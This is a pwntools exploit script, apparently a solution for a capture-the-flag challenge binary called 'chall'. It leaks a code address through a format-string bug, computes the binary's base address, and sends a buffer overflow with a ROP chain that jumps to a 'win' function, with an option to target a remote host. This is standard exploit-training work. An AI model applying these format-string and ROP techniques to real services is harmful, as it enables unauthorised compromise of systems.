from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def leak(self, content):
        p = self.p
        p.sendline(content)
        p.recvuntil(b"leak?")
        return p.recvuntil(b"|")[:-1]
    
    def send(self, content):
        p = self.p
        p.sendline(content)
    

def brute(n):
    with context.silent:
        for i in range(1, n):
            x, p = init()
            a = x.leak(f"%{i}$p|".encode())
            print(f"{i}: {a}")
            p.close()


x, p = init()

win_leak = eval(x.leak("%9$p|"))
exe.address = win_leak - exe.sym['win']
log.info(f"{exe.address:x}")

pay = cyclic(32+8)
pay += p64(ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
pay += p64(0xdeadbeef)
pay += p64(ROP(exe).find_gadget(['ret'])[0])
pay += p64(win_leak)

x.send(pay)

p.interactive()